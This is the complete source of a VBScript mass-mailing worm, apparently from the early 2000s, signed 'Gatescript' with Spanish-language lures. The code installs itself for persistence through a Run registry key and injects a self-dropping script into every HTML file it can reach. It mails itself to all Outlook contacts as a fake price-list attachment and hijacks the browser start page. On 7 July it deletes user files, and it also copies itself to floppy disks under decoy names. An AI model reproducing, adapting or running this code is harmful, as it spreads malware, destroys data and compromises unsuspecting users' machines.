   'PetiK
   ON ERROR RESUME NEXT
   Dim EMMcmsgigblgc
   Dim EMMcborrigblgc
   Dim EMMccoligblgc
   Dim zigblgc
   Dim EMMnarigblgc
   Dim EMMdiigblgc
   Dim EMMvaligblgc
   Dim EMMsenigblgc
   Dim EMMtecigblgc
   Dim vtecigblgc
   Dim Coigblgc
   Set EMMwshigblgc = CreateObject("WScript.Shell")
   Set EMMfsoigblgc= CreateObject("scripting.filesystemobject")
   EMMfsoigblgc.copyfile wscript.scriptfullname,EMMfsoigblgc.GetSpecialFolder(0) & "\emm.vbs"
   EMMwshigblgc.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM","wscript.exe " & EMMfsoigblgc.GetSpecialFolder(0) & "\emm.vbs %"
   EMMwshigblgc.regwrite "HKCU\software\" & Chr(71) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116),Chr(71) & Chr(101) & Chr(111) & Chr(99) & Chr(105) & Chr(116) & Chr(105) & Chr(101) & Chr(115) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(103) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
   If EMMwshigblgc.regread("HKCU\software\EMM\html") <> "1" Then
   HTML()
   End If
   Function HTML()
   ON ERROR RESUME NEXT
   For Each drvarigblgc In EMMfsoigblgc.drives
   Unigblgc = drigblgc & "\"
   Call HTLigblgc(Unigblgc)
   Next
   End Function
   Function HTLigblgc(Vaigblgc)
   Coigblgc = ""
   Set meigblgc = EMMfsoigblgc.OpenTextFile(wscript.scriptfullname, 1)
   Do While meigblgc.AtendOfStream = False
   Linigblgc = meigblgc.ReadLine
   Coigblgc = Coigblgc & Chr(34) & " & vbCrLf & " & Chr(34) & Replace(Linigblgc, Chr(34), Chr(34) & " & Chr(34) & " & Chr(34))
   Loop
   meigblgc.Close
   Crigblgc = Vaigblgc
   Set foigblgc = EMMfsoigblgc.GetFolder(Crigblgc)
   For Each Reigblgc In EMMfsoigblgc.GetFolder(Crigblgc).Files
   If LCase(EMMfsoigblgc.GetExtensionName(Reigblgc))="html" Or LCase(EMMfsoigblgc.GetExtensionName(Reigblgc))="htm" Then
   Dim Fpigblgc
   Dim Srligblgc
   Set Fpigblgc = EMMfsoigblgc.OpenTextFile(Reigblgc,1,False)
   Srligblgc= Fpigblgc.ReadAll
   Fpigblgc.Close
   Dim Tmpigblgc
   Tmpigblgc = ""
   Tmpigblgc = Tmpigblgc & VbCrlf & "<html> <body> <script language=" & Chr(34) & "vbscript" & Chr(34) & ">"
   Tmpigblgc = Tmpigblgc & VbCrlf & "ON ERROR RESUME NEXT"
   Tmpigblgc = Tmpigblgc & VbCrlf & "Set fsoigblgc = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) &")"
   Tmpigblgc = Tmpigblgc & VbCrlf & "Set Fsigblgc= fsoigblgc.CreateTextFile(fsoigblgc.getspecialfolder(0) & " & Chr(34) & "\Temp.vbs" & Chr(34) & " , True)"
   Tmpigblgc = Tmpigblgc & VbCrlf & "Fsigblgc.write" & Chr(34) & Coigblgc & Chr(34)
   Tmpigblgc = Tmpigblgc & VbCrlf & "Fsigblgc.Close"
   Tmpigblgc = Tmpigblgc & VbCrlf & "Set wsigblgc = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
   Tmpigblgc = Tmpigblgc & VbCrlf & "wsigblgc.run fsoigblgc.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fsoigblgc.getspecialfolder(0) & " & Chr(34) & "\Temp.vbs %" & Chr(34)
   Tmpigblgc = Tmpigblgc & VbCrlf & "If err.number <> 0 Then"
   Tmpigblgc = Tmpigblgc & VbCrlf & "alert(" & Chr(34) & "Error." & Chr(34) & " & vbCrLf & " & Chr(34) & "Esta pagina requiere ActiveX para funcionar correctamente." & Chr(34) & " & vbCrLf & " & Chr(34) & "Presione Actualizar y acepte la ejecucion de ActiveX." & Chr(34) & " & vbCrLf & " & Chr(34) & "Si no se le permite aceptar ActiveX, baje el nivel de seguridad de " & Chr(34) & " & vbCrLf & " & Chr(34) & "su navegador, o busque como permitir esta interaccion." & Chr(34) & " & vbCrLf & " & Chr(34) & "" & Chr(34) & ")"
   Tmpigblgc = Tmpigblgc & VbCrlf & "End If"
   Tmpigblgc = Tmpigblgc & VbCrlf & Chr(60) & Chr(47) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(62) & Chr(32) & Chr(60)& Chr(47) & Chr(98) & Chr(111) & Chr(100) & Chr(121) & Chr(47) & Chr(62) & Chr(32) & Chr(60) & Chr(47) & Chr(104) & Chr(116) & Chr(109) & Chr(108) & Chr(62)
   Set Htrigblgc = EMMfsoigblgc.OpenTextFile(Reigblgc,2,1)
   Htrigblgc.write Srligblgc & vbCrlf & Tmpigblgc
   Htrigblgc.Close
   End If
   Next
   Set Baigblgc= Foigblgc.SubFolders
   For Each Caigblgc In Baigblgc
   Call HTLigblgc(Caigblgc)
   Next
   EMMwshigblgc.regwrite "HKCU\software\EMM\html","1"
   End Function
   If EMMwshigblgc.regread("HKCU\software\EMM\correo") <> "1" Then
   Outigblgc()
   End If
   Function Outigblgc()
   ON ERROR RESUME NEXT
   Set igblgcApp = CreateObject("Outlook.Application")
   If igblgcApp = "Outlook" Then
   Set migblgc = igblgcApp.GetNameSpace("MAPI")
   Set mdigblgc = migblgc.AddressLists
   For Each Adligblgc In mdigblgc
   If Adligblgc.AddressEntries.Count <> 0 Then
   Set Msigblgc = igblgcApp.CreateItem(0)
   Msigblgc.Subject = "NO estimado Bill G."
   Msigblgc.Body = "Hola que tal," & vbCrlf & "Aqui le adjunto los precios para su funeraria." & vbCrlf & ""
   Msigblgc.Attachments.add EMMfsoigblgc.GetSpecialFolder(0)& "\emm.vbs"
   Msigblgc.DeleteAfterSubmit = True
   For zigblgc = 1 To Adligblgc.AddressEntries.Count
   If Adligblgc.AddressEntries.Count = 1 Then
   Msigblgc.To = Adligblgc.AddressEntries(zigblgc).Address
   Else
   Msigblgc.To = Msigblgc.To & "; " & Adligblgc.AddressEntries(zigblgc).Address
   End If
   Next
   Msigblgc.send
   End If
   Next
   igblgcApp.Quit
   EMMwshigblgc.regwrite "HKCU\software\EMM\correo","1"
   End If
   End Function
   If EMMwshigblgc.regread("HKCU\software\EMM\mensaje") <> "1" Then
   EMMwshigblgc.regwrite "HKCU\software\EMM\mensaje","1"
   Const Wri = 2
   Const Cr = True
   Dim File
   Dim F
   File = EMMfsoigblgc.GetSpecialFolder(0) & "\Msg.TXT"
   Set F = EMMfsoigblgc.opentextfile(File, Wri, Cr)
   F.write "geocities.com/gatescript" & vbCrlf & "RULES" & vbCrlf & "" & vbCrlf & "NO olvides visitar el sitio web" & vbCrlf & ""
   F.Close
   EMMwshigblgc.run "notepad "& EMMfsoigblgc.GetSpecialFolder(0) & "\Msg.TXT"
   End If
   EMMwshigblgc.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.geocities.com/gatescript"
   EMMwshigblgc.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Window title","GATESCRIPT RULES"
   If month(now) = 7 and day(now) = 7 Then
   For zigblgc = 0 to 100
   EMMwshigblgc.run ("C:\Windows\notepad.exe")
   Next
   End If
   If month(now) = 7 and day(now) = 7 Then
   EMMfsoigblgc.deletefile ("C:\Windows\*.jpg")
   EMMfsoigblgc.deletefile ("C:\Windows\*.bmp")
   EMMfsoigblgc.deletefile ("C:\Windows\Escritorio\*.*")
   EMMfsoigblgc.deletefile ("C:\misdoc~1\*.*")
   End If
   EMMvaligblgc = 0
   EMMtecigblgc = 0
   vtecigblgc = ""
   vtecigblgc = EMMwshigblgc.regread("HKCU\software\EMM\teclas")
   If vtecigblgc = "" Then
   vtecigblgc = 0
   End If
   vtecigblgc = vtecigblgc + 1
   EMMwshigblgc.regwrite "HKCU\software\EMM\teclas",vtecigblgc
   Randomize timer
   EMMdiigblgc = Int(Rnd * 6)
   diigblgc()
   Function diigblgc()
   On Error Resume Next
   Do
   EMMtecigblgc = EMMtecigblgc + 1
   EMMvaligblgc = EMMvaligblgc + 1
   If EMMdiigblgc = 0 Then EMMnarigblgc = "LEEME.TXT"
   If EMMdiigblgc = 1 Then EMMnarigblgc = "IMPORTANTE.TXT"
   If EMMdiigblgc = 2 Then EMMnarigblgc = "ARCHIVO"
   If EMMdiigblgc = 3 Then EMMnarigblgc = "JUEGOS"
   If EMMdiigblgc = 4 Then EMMnarigblgc = "MENSAJE.TXT"
   If EMMdiigblgc = 5 Then EMMnarigblgc = "SOLITARIO"
   If EMMnarigblgc = "" Then EMMnarigblgc = "LEEME.TXT"
   If EMMvaligblgc = 900000 Then
   EMMfsoigblgc.copyfile EMMfsoigblgc.GetSpecialFolder(0)& "\emm.vbs","a:\" & EMMnarigblgc & ".vbs"
   EMMvaligblgc = 0
   End If
   If EMMtecigblgc = 700000 Then
   If EMMwshigblgc.regread("HKCU\software\EMM\teclas") <= "1" Then
   EMMwshigblgc.sendkeys "Gatescript - Geocities.com/gatescript"
   End If
   EMMtecigblgc = 0
   End If
   Loop
   End Function
   'Gatescript - Geocities.com/gatescript
